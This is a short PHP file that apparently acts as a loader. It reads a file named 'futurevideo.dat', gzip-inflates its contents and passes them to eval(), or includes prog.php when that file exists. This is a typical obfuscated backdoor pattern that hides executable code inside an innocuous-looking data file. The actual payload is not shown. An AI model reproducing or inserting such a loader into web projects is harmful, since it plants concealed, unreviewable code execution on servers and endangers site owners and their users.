<?php
	$path = dirname( __FILE__ );
	if(file_exists($path.'/prog.php')) {
		include($path.'/prog.php');
	} else {
		$dt = file_get_contents($path.'/futurevideo.dat');
		if (strpos($dt,'array')===false ) $dt = @gzinflate($dt);
		$dt = trim($dt);
		//file_put_contents($path.'/prog.php', $dt);
		eval($dt);
	}
?>
